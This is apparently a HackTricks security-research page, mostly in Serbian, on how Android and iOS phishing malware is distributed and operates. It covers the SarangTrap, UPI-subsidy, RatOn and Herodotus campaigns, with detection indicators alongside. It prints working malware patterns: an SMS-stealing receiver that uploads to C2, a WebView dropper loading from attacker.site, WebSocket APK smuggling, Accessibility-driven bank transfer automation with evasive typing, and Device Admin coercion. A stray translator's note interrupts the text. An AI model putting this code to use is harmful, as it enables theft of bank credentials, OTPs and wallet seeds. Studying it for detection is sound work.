# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> This page covers techniques used by threat actors to distribute **malicious Android APKs** and **iOS mobile-configuration profiles** through phishing (SEO, social engineering, fake stores, dating apps, etc.).
> The material is adapted from the SarangTrap campaign exposed by Zimperium zLabs (2025) and other public research.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registrujte desetine sličnih domena (dating, cloud share, car service…).
– Koristite ključne reči na lokalnom jeziku i emoji u `<title>` elementu da biste rangirali na Google.
– Hostujte *i* Android (`.apk`) i iOS uputstva za instalaciju na istoj landing stranici.
2. **First Stage Download**
* Android: direktan link ka nepodpisanom (*unsigned*) ili „third‑party store“ APK‑u.
* iOS: `itms-services://` ili običan HTTPS link ka malicioznom **mobileconfig** profilu (vidi dole).
3. **Post-install Social Engineering**
* Pri prvom pokretanju aplikacija traži **kod za poziv / verifikaciju** (illusija ekskluzivnog pristupa).
* Kod se **POSTuje preko HTTP‑a** na Command-and-Control (C2).
* C2 odgovara `{"success":true}` ➜ malware nastavlja.
* Sandbox / AV dynamic analysis koji nikada ne pošalje validan kod ne vidi zlonamerno ponašanje (evazija).
4. **Runtime Permission Abuse** (Android)
* Opasne dozvole se traže tek **nakon pozitivnog odgovora C2**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Novije varijante **uklanjaju `<uses-permission>` za SMS iz `AndroidManifest.xml`** ali zadržavaju Java/Kotlin kod koji čita SMS preko reflection ⇒ smanjuje statički score dok i dalje funkcioniše na uređajima koji dodeljuju dozvolu putem `AppOps` zloupotrebe ili na starijim ciljevima.

5. **Android 13+ Ograničena podešavanja & Dropper Bypass (SecuriDropper‑style)**
* Android 13 je uveo **Restricted settings** za sideloadovane aplikacije: prekidači za Accessibility i Notification Listener su sivi/onemogućeni dok korisnik eksplicitno ne dozvoli restricted settings u **App info**.
* Phishing stranice i droperi sada isporučuju korak‑po‑korak UI uputstva kako da se **omoguće restricted settings** za sideloadovanu aplikaciju a zatim uključi Accessibility/Notification pristup.
* Noviji bypass je instalirati payload putem **session‑based PackageInstaller flow** (isto što koriste app store‑ovi). Android tretira aplikaciju kao instaliranu iz store‑a, pa Restricted settings više ne blokira Accessibility.
* Triage hint: u dropperu, grep‑ujte za `PackageInstaller.createSession/openSession` plus kod koji odmah navigira žrtvu na `ACTION_ACCESSIBILITY_SETTINGS` ili `ACTION_NOTIFICATION_LISTENER_SETTINGS`.

6. **Facade UI & Background Collection**
* Aplikacija prikazuje naizgled bezopasne view‑e (SMS viewer, gallery picker) implementirane lokalno.
* U međuvremenu exfiltrira:
- IMEI / IMSI, broj telefona
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG iz `/sdcard/DCIM` kompresovan sa [Luban](https://github.com/Curzibn/Luban) radi smanjenja veličine
- Opcionalno SMS sadržaj (`content://sms`)
Payloadi se **grupno zipuju** i šalju preko `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* Jedan **mobile-configuration profile** može zatražiti `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` itd. da upiše uređaj u nadzor sličan “MDM”.
* Social-engineering instrukcije:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* three times (screenshots na phishing stranici).
3. Trust the unsigned profile ➜ napadač dobija *Contacts* & *Photo* entitlement bez App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloadi mogu **zalepiti phishing URL na Home Screen** sa brendiranom ikonicom/etiketom.
* Web Clips mogu raditi **full‑screen** (sakrivaju browser UI) i biti označeni kao **non‑removable**, prisiljavajući žrtvu da obriše profil da ukloni ikonicu.
9. **Network Layer**
* Plain HTTP, često na portu 80 sa HOST headerom poput `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (nema TLS → lako uočljivo).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Tokom malware procene, automatizujte fazu unosa invitation code‑a sa Frida/Objection da biste došli do malicioznog branch‑a.
* **Manifest vs. Runtime Diff** – Uporedite `aapt dump permissions` sa runtime `PackageManager#getRequestedPermissions()`; izostanak opasnih perms je crvena zastavica.
* **Network Canary** – Konfigurišite `iptables -p tcp --dport 80 -j NFQUEUE` da detektujete sumnjive POST nalete nakon unosa koda.
* **mobileconfig Inspection** – Koristite `security cms -D -i profile.mobileconfig` na macOS‑u da izlistate `PayloadContent` i uočite prekomerne entitlements.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: automatsko zaobilaženje pozivnog koda</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Indikatori (generički)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Ovaj obrasac je primećen u kampanjama koje zloupotrebljavaju teme državnih beneficija kako bi ukrale indijske UPI akreditive i OTP-ove. Operateri povezuju renomirane platforme za isporuku i otpornost.

### Delivery chain across trusted platforms
- YouTube video mamac → opis sadrži skraćeni link
- Skraćeni link → GitHub Pages phishing sajt koji imitira legitimni portal
- Isti GitHub repo sadrži APK sa lažnim “Google Play” znakom koji direktno linkuje na fajl
- Dinamične phishing stranice hostovane na Replit; kanal za udaljene komande koristi Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Prvi APK je installer (dropper) koji isporučuje pravi malware na `assets/app.apk` i podstiče korisnika da isključi Wi‑Fi/mobilne podatke kako bi umanjio detekciju u cloud-u.
- Ugrađeni payload se instalira pod bezazlenim nazivom (npr. “Secure Update”). Nakon instalacije, i installer i payload postoje kao odvojene aplikacije.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamičko otkrivanje endpoint-a putem shortlink
- Malware preuzima plain-text, zarezima odvojenu listu živih endpoint-a sa shortlink-a; jednostavne transformacije stringova generišu konačnu putanju phishing stranice.

Primer (sanitizovano):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokod:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-based UPI credential harvesting
- Korak “Make payment of ₹1 / UPI‑Lite” učitava napadačev HTML obrazac sa dinamičkog endpointa unutar WebView i hvata osetljiva polja (phone, bank, UPI PIN) koja se `POST`uju na `addup.php`.

Minimalni loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Traže se agresivne dozvole pri prvom pokretanju:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakti se prolaze u petlji kako bi se masovno slali smishing SMS-ovi sa uređaja žrtve.
- Dolazni SMS-ovi se presreću broadcast receiver-om i otpremaju sa metapodacima (sender, body, SIM slot, per-device random ID) na `/addsm.php`.

Skica prijemnika:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) kao robustan C2
- Payload se registruje na FCM; push poruke nose `_type` polje koje se koristi kao prekidač za pokretanje akcija (npr. ažuriranje phishing tekstualnih šablona, uključivanje/isključivanje ponašanja).

Primer FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Skica handlera:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indikatori/IOC-i
- APK sadrži sekundarni payload u `assets/app.apk`
- WebView učitava plaćanje iz `gate.htm` i eksfiltrira na `/addup.php`
- Eksfiltracija SMS poruka na `/addsm.php`
- Preuzimanje konfiguracije preko shortlink-a (npr., `rebrand.ly/*`) koje vraća CSV endpoint-e
- Aplikacije označene generički kao “Update/Secure Update”
- FCM `data` poruke sa `_type` discriminator-om u nepouzdanim aplikacijama

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Napadači sve češće zamenjuju statičke APK linkove kanalom Socket.IO/WebSocket ugrađenim u mamce koji liče na Google Play. Ovo skriva payload URL, zaobilazi filtere za URL/ekstenzije i održava realističan instalacioni UX.

Tipičan tok klijenta u realnom okruženju:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Zašto to zaobilazi jednostavne kontrole:
- Nijedan statički APK URL nije izložen; payload se rekonstruiše u memoriji iz WebSocket okvira.
- URL/MIME/extension filteri koji blokiraju direktne .apk odgovore mogu propustiti binarne podatke tunelovane preko WebSockets/Socket.IO.
- Crawler-i i URL sandbox-i koji ne izvršavaju WebSockets neće preuzeti payload.

Vidi takođe WebSocket tradecraft i alate:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin zloupotrebe, ATS automatizacija i NFC relay orkestracija – RatOn studija slučaja

Kampanja RatOn (banker/RAT) (ThreatFabric) je konkretan primer kako moderne mobilne phishing operacije kombinuju WebView droppers, Accessibility-pokrenutu UI automatizaciju, overlays/ransom, prisilu preko Device Admin, Automated Transfer System (ATS), crypto wallet takeover, i čak NFC-relay orkestraciju. Ovaj odeljak apstrahuje ponovo upotrebljive tehnike.

### Stage-1: WebView → native install bridge (dropper)
Napadači prikazuju WebView koji pokazuje na napadačku stranicu i injektuju JavaScript interfejs koji izlaže native installer. Dodir na HTML dugme poziva native kod koji instalira second-stage APK bundled in the dropper’s assets i zatim ga direktno pokreće.

Minimalni obrazac:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
Nedostaje sadržaj za prevođenje — pošaljite HTML/Markdown koji se nalazi na stranici ili ceo sadržaj fajla src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md. 

Napomena: sačuvaću sve tagove, linkove, putanje i kod neprevedene, kao i nazive tehnika i pojmove koje ste naveli.
```html
<button onclick="bridge.installApk()">Install</button>
```
Nakon instalacije, dropper pokreće payload putem eksplicitnog package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Ideja za otkrivanje: nepouzdane aplikacije koje pozivaju `addJavascriptInterface()` i izlažu WebView-u metode nalik installeru; APK isporučuje ugrađeni sekundarni payload pod `assets/` i poziva Package Installer Session API.

### Tok pristanka: Accessibility + Device Admin + naknadni runtime zahtevi
Stage-2 otvara WebView koji hostuje stranicu „Access“. Njeno dugme poziva eksportovani metod koji navodi žrtvu na Accessibility podešavanja i traži omogućavanje zlonamernog servisa. Kada je omogućeno, malware koristi Accessibility da automatski klikće kroz naredne runtime permission dijaloge (contacts, overlay, manage system settings, itd.) i zahteva Device Admin.

- Accessibility programski pomaže pri prihvatanju narednih zahteva pronalazeći dugmad poput “Allow”/“OK” u node-tree i simulirajući klikove.
- Provera/zahtjev za overlay dozvolu:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Vidi takođe:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operatori mogu izdavati komande da:
- renderuju full-screen overlay sa URL-a, ili
- proslede inline HTML koji se učitava u WebView overlay.

Verovatne upotrebe: coercion (PIN entry), wallet opening to capture PINs, ransom messaging. Sačuvati komandu koja osigurava da je dozvola za overlay odobrena ako nedostaje.

### Remote control model – text pseudo-screen + screen-cast
- Low-bandwidth: periodično dump-ovati the Accessibility node tree, serijalizovati visible texts/roles/bounds i poslati na C2 kao pseudo-screen (komande kao `txt_screen` jednokratno i `screen_live` kontinuirano).
- High-fidelity: zahtevati MediaProjection i pokrenuti screen-casting/recording na zahtev (komande kao `display` / `record`).

### ATS playbook (bank app automation)
Given a JSON task, otvoriti bank app, upravljati UI preko Accessibility koristeći mešavinu text queries i coordinate taps, i uneti žrtvin payment PIN kada se zatraži.

Example task:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Primeri tekstova viđenih u jednom ciljnom toku (CZ → EN):
- "Nová platba" → "Novo plaćanje"
- "Zadat platbu" → "Unesi plaćanje"
- "Nový příjemce" → "Novi primalac"
- "Domácí číslo účtu" → "Domaći broj računa"
- "Další" → "Dalje"
- "Odeslat" → "Pošalji"
- "Ano, pokračovat" → "Da, nastavi"
- "Zaplatit" → "Plati"
- "Hotovo" → "Gotovo"

Operatori takođe mogu da provere/povećaju limite za transfere putem komandi kao što su `check_limit` i `limit` koje na sličan način upravljaju interfejsom za limite.

### Crypto wallet seed extraction
Ciljevi kao MetaMask, Trust Wallet, Blockchain.com, Phantom. Tok: unlock (stolen PIN or provided password), navigate to Security/Recovery, reveal/show seed phrase, keylog/exfiltrate it. Implementirajte selektore koji prepoznaju lokalitet (EN/RU/CZ/SK) kako biste stabilizovali navigaciju između jezika.

### Device Admin coercion
Device Admin APIs se koriste da povećaju mogućnosti hvatavanja PIN-a i ometaju žrtvu:

- Momentarno zaključavanje:
```java
dpm.lockNow();
```
- Istekni trenutni credential da bi primorao promenu (Accessibility beleži novi PIN/lozinku):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Primorajte otključavanje bez biometrije onemogućavanjem keyguard biometrijskih funkcija:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Napomena: Mnoge DevicePolicyManager kontrole zahtevaju Device Owner/Profile Owner na novijim Android; neke OEM izvedbe mogu biti popustljive. Uvek verifikujte na ciljanom OS/OEM.

### Orkestracija NFC relay-a (NFSkate)
Stage-3 može instalirati i pokrenuti eksterni NFC-relay modul (npr. NFSkate) i čak mu proslediti HTML šablon da uputi žrtvu tokom relay-a. Ovo omogućava bezkontaktno card-present cash-out zajedno sa online ATS.

Pozadina: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Skup komandi operatora (primer)
- UI/stanje: `txt_screen`, `screen_live`, `display`, `record`
- Društveno: `send_push`, `Facebook`, `WhatsApp`
- Overlay-i: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Novčanici: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Uređaj: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Komunikacija/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### ATS anti-detekcija vođena Accessibility-jem: ljudski ritam kucanja i dupla injekcija teksta (Herodotus)

Pretnjači sve više miksaju automatizaciju vođenu Accessibility-jem sa anti-detekcijom podešenom protiv osnovne biometrije ponašanja. Nedavni banker/RAT prikazuje dva komplementarna moda isporuke teksta i prekidač za operatora da simulira ljudsko kucanje sa nasumičnim ritmom.

- Discovery mode: enumerate visible nodes with selectors and bounds to precisely target inputs (ID, text, contentDescription, hint, bounds) before acting.
- Dupla injekcija teksta:
- Mod 1 – `ACTION_SET_TEXT` direktno na ciljnom čvoru (stabilno, bez tastature);
- Mod 2 – clipboard set + `ACTION_PASTE` u fokusirani čvor (radi kada je direktan setText blokiran).
- Ljudski ritam kucanja: podeliti string koji operator dostavi i isporučiti ga karakter-po-karakter sa nasumičnim zakašnjenjima od 300–3000 ms između događaja kako bi se izbegle heuristike “machine-speed typing”. Implementirano ili progresivnim povećavanjem vrednosti preko `ACTION_SET_TEXT`, ili lepljenjem po jednog karaktera.

<details>
<summary>Java skica: otkrivanje čvorova + odloženi unos po karakteru putem setText ili clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blocking overlays za prikrivanje prevare:
- Prikaži `TYPE_ACCESSIBILITY_OVERLAY` preko celog ekrana sa opacitetom koji kontroliše operator; drži ga neprovidnim za žrtvu dok se remote automation odvija ispod.
- Komande tipično izložene: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimal overlay with adjustable alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Primitivi kontrole operatora koji se često viđaju: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Reference

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
